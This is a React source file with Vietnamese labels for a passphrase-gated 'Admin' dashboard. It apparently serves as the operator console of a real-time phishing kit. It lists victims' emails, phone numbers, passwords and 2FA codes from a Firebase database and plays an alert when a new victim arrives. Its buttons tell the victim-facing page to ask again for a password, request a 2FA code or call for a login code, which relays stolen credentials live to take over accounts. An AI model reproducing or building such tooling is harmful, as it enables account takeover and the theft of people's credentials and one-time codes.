import { onValue, ref, set, update } from "firebase/database";
import { useEffect, useState } from "react";
import InputText from "../Components/UI/InputText/InputText";
import { database } from "../Utils/firebase";

let count = 0;
// Create an audio element
var audio = new Audio("/notify.mp3");

const MainAdmin = () => {
  const [records, setRecords] = useState([]);
  console.log(records);
  useEffect(() => {
    const starCountRef = ref(database);
    onValue(starCountRef, (snapshot) => {
      const data = snapshot.val();
      const dataentries = Object.entries(data);
      const arr = [];
      for (let [key, value] of dataentries) {
        arr.push({
          uid: key,
          ...value,
        });
      }

      setRecords(arr?.sort((a, b) => a?.timestamp - b?.timestamp));

      if (arr.length != count) {
        if (count > 0) {
          // Play the sound
          audio.play();
        }
        count = arr.length;
      }
    });
  }, []);

  const updateRecords = (status, uid) => {
    const updates = {};

    updates["/" + uid + "/" + "user_status"] = status;
    update(ref(database), updates);
  };

  const handleDone = (uid) => {
    const updates = {};
    updates["/" + uid + "/" + "done"] = true;
    update(ref(database), updates);
  };

  const handleDelete = () => {
    if (window.confirm("Xác nhận xoá tất cả ?")) {
      set(ref(database), null).then(() => {
        setRecords([]);
      });
    }
  };

  const handleTurnOffAudio = () => {
    if (audio) {
      audio.pause();
    }
  };

  return (
    <div className="p-5 pt-3 ">
      <div className="d-flex justify-content-between align-items-center mb-3">
        <button className="btn btn-sm btn-danger  ms-4" onClick={handleDelete}>
          Xoá tất cả
        </button>
        <img
          src="/coollogo_com-292624121.png"
          style={{
            width: 200,
            display: "block",
          }}
        />
        <button
          className="btn btn-sm btn-secondary  "
          onClick={handleTurnOffAudio}
        >
          Tắt âm
        </button>
      </div>
      <table className="table">
        <thead>
          <tr>
            <th scope="col">#</th>
            <th scope="col">Tool status</th>
            <th scope="col">Email</th>
            <th scope="col">SDT</th>
            <th
              scope="col"
              style={{
                maxWidth: 300,
              }}
            >
              Mật khẩu
            </th>
            <th scope="col">Mã 2fa</th>
            <th scope="col">Trạng thái </th>
            <th scope="col">Hành động của admin </th>
          </tr>
        </thead>
        <tbody>
          {records.map((d, index) => {
            return (
              <tr key={d.uid}>
                <th scope="row">{index + 1}</th>
                <th>
                  <div className="d-flex">
                    <div
                      // contentEditable
                      className={`${
                        d?.done || d?.user_status == "6"
                          ? "text-black"
                          : d?.user_status == "5"
                          ? "text-danger"
                          : "text-warning"
                      }`}
                      style={{
                        border: "1px solid",
                        height: "auto",
                        width: 150,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        padding: 2.5,
                      }}
                    >
                      {d?.done && "DONE"}
                      {d?.user_status === "5" && !d?.done && <>TOOL đang lỗi</>}
                      {d?.user_status === "6" && !d?.done && (
                        <>TOOL thành công</>
                      )}
                      {![
                        "5",
                        "6",
                        "Chờ user nhập mã đăng nhập",
                        "Đang chờ xác nhận mã đăng nhập từ admin",
                        "Đã xác nhận mã đăng nhập",
                      ].includes(d?.user_status) &&
                        !d?.done && <>TOOL đang xử lí</>}
                      {[
                        "Chờ user nhập mã đăng nhập",
                        "Đang chờ xác nhận mã đăng nhập từ admin",
                        "Đã xác nhận mã đăng nhập",
                      ].includes(d?.user_status) &&
                        !d?.done &&
                        "Đang xử lí"}
                    </div>
                    <button
                      className="btn btn-sm btn-secondary ms-2"
                      onClick={() => handleDone(d.uid)}
                      style={{}}
                    >
                      Done
                    </button>
                  </div>
                </th>
                <td>{d.email}</td>
                <td>{d.phone}</td>
                <td
                  style={{
                    maxWidth: 300,
                  }}
                >
                  <>
                    <span>{d?.current_password}</span>
                    <br />
                  </>
                </td>
                <td>{d["2facode"]}</td>
                <td>{d?.user_status}</td>
                <td>
                  <div className="d-flex">
                    {(d?.user_status === "1" || d?.user_status === "2z") && (
                      <div>
                        {/* <button
                          className="btn btn-sm mb-2 btn-success me-2"
                          onClick={() => {
                            updateRecords(
                              "Đang chờ bước waiting cuối cùng từ admin",
                              d.uid
                            );
                          }}
                        >
                          Đi đến bước cuối
                        </button> */}
                        <button
                          className="btn btn-sm mb-2 btn-danger me-2"
                          onClick={() => {
                            updateRecords("2", d.uid);
                          }}
                        >
                          Sai mật khẩu
                        </button>
                        <button
                          className="btn btn-sm mb-2 btn-warning"
                          onClick={() => {
                            updateRecords("3", d.uid);
                          }}
                        >
                          Yêu cầu 2fa
                        </button>
                      </div>
                    )}
                    {d?.user_status === "3z" && d["2facode"] && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-success me-2"
                          onClick={() => {
                            updateRecords("6", d.uid);
                          }}
                          //
                        >
                          Đúng mã 2FA
                        </button>
                        <button
                          className="btn btn-sm mb-2 btn-danger"
                          onClick={() => {
                            updateRecords("3", d.uid);
                          }}
                        >
                          Sai mã 2fa
                        </button>
                      </div>
                    )}
                    {/* {d?.user_status === "User yêu cầu gửi lại mã 2fa" && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-success"
                          onClick={() => {
                            updateRecords("Đã gửi lại mã 2fa", d.uid);
                          }}
                        >
                          Xác nhận đã gửi lại 2fa
                        </button>
                      </div>
                    )} */}
                    {(d?.user_status === "6" || d?.user_status === "5") && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-warning me-2"
                          onClick={() => {
                            updateRecords("Chờ user nhập mã đăng nhập", d.uid);
                          }}
                        >
                          Gọi mã
                        </button>
                        {d?.user_status === "5" && (
                          <>
                            <button
                              className="btn btn-sm mb-2 btn-danger me-2"
                              onClick={() => {
                                updateRecords("2", d.uid);
                              }}
                            >
                              Sai mật khẩu
                            </button>
                            <button
                              className="btn btn-sm mb-2 btn-danger"
                              onClick={() => {
                                updateRecords("3", d.uid);
                              }}
                            >
                              Sai mã 2fa
                            </button>
                          </>
                        )}
                      </div>
                    )}

                    {d?.user_status ===
                      "Đang chờ bước waiting cuối cùng từ admin" && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-warning"
                          onClick={() => {
                            updateRecords("Chờ user nhập mã đăng nhập", d.uid);
                          }}
                        >
                          Gọi mã
                        </button>
                      </div>
                    )}
                    {d?.user_status ===
                      "Đang chờ xác nhận mã đăng nhập từ admin" && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-success me-2"
                          onClick={() => {
                            updateRecords("Đã xác nhận mã đăng nhập", d.uid);
                          }}
                        >
                          Đến bước chờ loading
                        </button>
                        <button
                          className="btn btn-sm mb-2 btn-danger"
                          onClick={() => {
                            updateRecords("Sai mã đăng nhập", d.uid);
                          }}
                        >
                          Sai mã đăng nhập
                        </button>
                      </div>
                    )}
                    {d?.user_status === "User yêu cầu gửi lại mã đăng nhập" && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-success"
                          onClick={() => {
                            updateRecords("Đã gửi lại mã đăng nhập", d.uid);
                          }}
                        >
                          Xác nhận đã gửi mã login
                        </button>
                      </div>
                    )}
                    {d?.user_status === "Đã xác nhận mã đăng nhập" && (
                      <div className="d-flex">
                        <button
                          className="btn btn-sm mb-2 btn-warning"
                          onClick={() => {
                            updateRecords("Chờ user nhập mã đăng nhập", d.uid);
                          }}
                        >
                          Gọi mã
                        </button>
                      </div>
                    )}
                  </div>
                </td>
              </tr>
            );
          })}
        </tbody>
      </table>
    </div>
  );
};

const Admin = () => {
  const [step, setStep] = useState(1);
  const [value, setValue] = useState("");

  const handle = () => {
    if (value === "$PhLmfw5mWIynJK5Mk&3") {
      setStep(2);
    }
  };

  return (
    <>
      {step == 1 ? (
        <div
          style={{
            margin: "auto",
            maxWidth: "500px",
            marginTop: "5vh",
          }}
        >
          <InputText value={value} fun={(e) => setValue(e.target.value)}>
            Nhập mã bí mật
          </InputText>
          <button onClick={handle} className="btn btn-primary w-100">
            Tiếp tục
          </button>
        </div>
      ) : (
        <MainAdmin />
      )}
    </>
  );
};

export default Admin;
